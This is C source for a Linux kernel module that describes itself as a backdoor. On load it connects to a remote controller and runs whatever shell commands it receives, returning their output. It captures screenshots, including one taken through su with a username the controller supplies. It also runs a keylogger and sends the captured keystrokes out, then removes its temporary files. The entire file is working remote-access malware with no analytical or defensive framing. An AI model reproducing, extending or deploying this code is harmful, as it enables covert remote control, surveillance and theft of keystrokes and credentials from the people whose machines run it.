#include "functions.h"
#include "keylogger.h"

/*
    Init module function.
    Creates a socket connection, receives messages,
    execute them as shell commands and send the response back.
*/
static int backdoor_init(void) {
    struct socket *sock;
    struct sockaddr_in server_addr;
    int ret;
    char buffer[BUFFER_SIZE];
    int error;
    char filename[30];
    char username[30];
    char keylog_buffer[BUFFER_SIZE];

    printk(KERN_INFO "backdoor: initializing\n");

    // Create a socket
    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        printk(KERN_ERR "backdoor: error creating socket\n");
        return ret;
    }

    // Set up server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = in_aton(SERVER_IP);
    server_addr.sin_port = htons(SERVER_PORT);

    // Connect to the server
	while(1) {
    	ret = sock->ops->connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
    	if (ret < 0) {
    	    printk(KERN_ERR "backdoor: error connecting to server\n");	
    	    continue;
    	}
		else {
			break;
		}
	}
    
    keylogger_init();
    
    // Temporary file with the command output
    memset(filename, 0, 30);
    strcpy(filename, "/tmp/output.txt");

    // Send and receive messages
    while (1) {
    	// Receive the chosen option
        error = receive_message(sock, buffer, BUFFER_SIZE);
        if (error <= 0) {
            break;
        }
        
        // Remove '\n' of the end of the buffer
        if (buffer[strlen(buffer)-1] == '\n') {
        	buffer[strlen(buffer)-1] = '\0';
        }     

        printk(KERN_INFO "backdoor: received option: %s\n", buffer);
	
		// If option == 5, end connection
		if (!strcmp(buffer, "5")) {
			break;
		}
		else if (!strcmp(buffer, "1")) {	// Run shell commands
			while(1) {
				// Receive the command
        		error = receive_message(sock, buffer, BUFFER_SIZE);
        		if (error <= 0) {
            		break;
        		}
        		// Remove '\n' of the end of the buffer
        		if (buffer[strlen(buffer)-1] == '\n') {
        			buffer[strlen(buffer)-1] = '\0';
        		}
        		printk(KERN_INFO "backdoor: received command: %s\n", buffer);
        		// If command == quit, choose another option
				if (!strcmp(buffer, "quit")) {
					break;
				}
				// Execute the shell command
        		error = execute_shell_command(buffer);
        		if (error < 0) {
            		break;
        		}
        		// Read the temporary output file
				error = read_file(sock, filename);
				if (error <= 0) {
            		break;
        		}
        	}
		}
		else if (!strcmp(buffer, "2")) {	// PPM screenshot (dont support graphic interfaces)
			error = screenshot_ppm();
			if (error < 0) {
				printk(KERN_ERR "backdoor: erro print screen");
				break;
			}
			msleep(1000);
			memset(buffer, 0, BUFFER_SIZE);
			// Send the hexdump of the image, will be turned into an image by the python script
    		strcpy(buffer, "xxd -p /tmp/screenshot.ppm");
    		error = execute_shell_command(buffer);
    		if (error < 0) {
            	break;
        	}
        	// Read the temporary output file
			error = read_file(sock, filename);
			if (error <= 0) {
            	break;
        	}
		}
		else if (!strcmp(buffer, "3")) {	// PNG screenshot (graphic interface)
			memset(username, 0, 30);
			// Receive the username
        	error = receive_message(sock, username, BUFFER_SIZE);
        	if (error <= 0) {
            	break;
        	}
        	// Remove '\n' of the end of the buffer
        	if (username[strlen(username)-1] == '\n') {
        		username[strlen(username)-1] = '\0';
        	}
			
			memset(buffer, 0, BUFFER_SIZE);
			// Takes an screenshot in userspace
    		strcpy(buffer, "su -c \"gnome-screenshot -f /tmp/screenshot.png\" -s /bin/bash ");
    		strcat(buffer, username);
    		error = execute_shell_command(buffer);
    		if (error < 0) {
            	break;
        	}        	
        	msleep(5000);
        	
        	memset(buffer, 0, BUFFER_SIZE);
        	// Send the hexdump of the image, will be turned into an image by the python script
        	strcpy(buffer, "xxd -p /tmp/screenshot.png");
    		error = execute_shell_command(buffer);
    		if (error < 0) {
            	break;
        	}        	
        	// Read the temporary output file
			error = read_file(sock, filename);
			if (error <= 0) {
            	break;
        	}		
		}
		else if (!strcmp(buffer, "4")) {	// Read keybord inputs
			memset(keylog_buffer, 0, BUFFER_SIZE);
			set_keylog_buffer(keylog_buffer);
			
			send_message(sock, keylog_buffer);			
		}
		else {
			break;
		}
    
    }
    
    // Delete screenshot.ppm and screenshot.png
    memset(buffer, 0, BUFFER_SIZE);
    strcpy(buffer, "rm /tmp/screenshot.ppm");
    error = execute_shell_command(buffer);
    if (error < 0) {
        goto release_sock;
    }
    memset(buffer, 0, BUFFER_SIZE);
    strcpy(buffer, "rm /tmp/screenshot.png");
    error = execute_shell_command(buffer);
    if (error < 0) {
        goto release_sock;
    }
    // Delete the temporary file 
    memset(buffer, 0, BUFFER_SIZE);
    strcpy(buffer, "rm /tmp/output.txt");
    error = execute_shell_command(buffer);
    if (error < 0) {
        goto release_sock;
    }
    
    goto release_sock;

release_sock:
	keylogger_exit();
    sock_release(sock);
    return 0;
}
/*
    Exit module function.
*/
static void backdoor_exit(void) {
    printk(KERN_INFO "backdoor: exiting\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Matheus Pereira Dias");
MODULE_DESCRIPTION("Linux kernel module backdoor using sockets.");
MODULE_VERSION("0.1");
